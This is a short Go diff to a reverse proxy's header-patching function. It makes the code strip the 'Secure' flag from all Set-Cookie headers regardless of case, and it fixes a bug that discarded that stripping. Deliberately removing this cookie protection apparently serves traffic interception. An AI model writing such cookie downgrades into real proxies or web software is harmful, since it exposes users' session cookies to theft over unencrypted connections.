@@ -234,8 +234,9 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 
 		for i, v := range httpResponse.Header["Set-Cookie"] {
 			//strip out the secure Flag
-			cookie := strings.Replace(v, "Secure;", "", -1)
-			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(v, TranslateSetCookie)
+			r := strings.NewReplacer("Secure", "", "secure", "")
+			cookie := r.Replace(v)
+			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(cookie, TranslateSetCookie)
 			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
 		}
